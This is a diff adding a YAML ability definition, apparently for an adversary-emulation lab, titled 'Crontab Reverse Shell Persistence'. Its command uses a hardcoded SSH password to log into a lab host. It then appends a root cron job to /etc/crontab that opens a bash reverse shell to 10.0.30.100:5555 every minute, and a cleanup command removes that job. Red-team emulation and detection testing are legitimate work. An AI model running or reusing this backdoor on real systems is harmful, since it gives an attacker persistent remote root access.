@@ -1,0 +1,16 @@
+- id: pe02-crontab-backdoor
+  name: Crontab Reverse Shell Persistence
+  description: Inject reverse shell into crontab on web-server-1 for persistent access
+  tactic: persistence
+  technique:
+    attack_id: T1053.003
+    name: Scheduled Task/Job - Cron
+  platforms:
+    linux:
+      sh:
+        command: |
+          sshpass -p 'toor' ssh -o StrictHostKeyChecking=no labuser@10.0.20.21 "echo '* * * * * root bash -i >&  /dev/tcp/10.0.30.100/5555 0>&1' >> /etc/crontab" 2>/dev/null && echo '[+] Crontab backdoor set' || echo 'Crontab persistence attempted'
+        cleanup: |
+          sshpass -p 'toor' ssh -o StrictHostKeyChecking=no labuser@10.0.20.21 "sed -i '/10.0.30.100\/5555/d' /etc/crontab" 2>/dev/null
+  singleton: false
+  repeatable: false
